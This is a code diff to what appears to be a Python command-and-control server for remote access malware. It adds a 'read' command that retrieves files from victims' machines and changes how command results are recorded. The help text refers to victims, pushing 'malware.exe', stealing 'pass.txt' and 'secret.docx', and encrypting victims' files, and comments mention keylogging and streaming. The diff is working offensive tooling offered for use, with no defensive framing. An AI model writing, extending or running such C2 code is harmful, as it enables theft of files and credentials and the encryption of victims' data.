@@ -219,6 +219,7 @@ class DatabaseManager:
                 updates.append("is_active = 0")
             elif status == 'executing':
                 updates.append("is_active = 1")
+            
             if status in ('completed', 'failed', 'cancelled'):
                 updates.append("execution_time = ?")
                 params.append(ts)
@@ -760,15 +761,10 @@ class AdvancedC2Server:
             rid = msg.get('id') or 'cmd'
             data = msg.get('data')
             
-            # Check if command is active and should remain executing
-            try:
-                row = self.db.execute("SELECT is_active, status FROM commands WHERE id = ?", (rid,)).fetchone()
-                if row and row['is_active'] == 1:
-                    self.db.update_command_status(rid, row['status'], result=json.dumps(data), is_active=1)
-                else:
-                    self.db.update_command_status(rid, 'completed', result=json.dumps(data))
-            except Exception as e:
-                self.db.update_command_status(rid, 'completed', result=json.dumps(data))
+            # One-shot commands should transition to 'completed' even if is_active was 1
+            # Only persistent commands like 'keylog start' or 'stream' should skip this
+            # Actually, most commands that return a 'result' should be considered completed.
+            self.db.update_command_status(rid, 'completed', result=json.dumps(data), is_active=0)
             
             print(f"{Fore.CYAN}\n[RESULT][{cid}] [{rid}]")
             if isinstance(data, dict):
@@ -966,6 +962,7 @@ class CommandParser:
             # --- Files ---
             elif cmd == 'download': self.server.send_command(targets, 'download', {'path': args[0]})
             elif cmd == 'upload': self._upload(targets, args[0])
+            elif cmd == 'read': self.server.send_command(targets, 'read_file', {'path': args[0]})
             elif cmd == 'write': self.server.send_command(targets, 'write_file', {'path': args[0], 'content': ' '.join(args[1:])})
             elif cmd == 'browse': self.server.send_command(targets, 'file_browser', {'path': args[0] if args else '.'})
             elif cmd == 'crypt': self.server.send_command(targets, 'file_crypt', {'path': args[0], 'action': args[1]})
@@ -1187,6 +1184,8 @@ class CommandParser:
                        Ex: download C:\\Users\\target\\secret.docx
   {G}upload <local_file>{W}  Push a local file to the victim's current working directory
                        Ex: upload ./malware.exe
+  {G}read <path>{W}          Read the contents of a remote file
+                       Ex: read C:\Users\target\Documents\pass.txt
   {G}write <path> <text>{W}  Create/overwrite a file with given text content
                        Ex: write C:\\Temp\\note.txt "hello world"
   {G}crypt <path> <action>{W} Encrypt or decrypt a file/folder using AES-256 (Fernet)
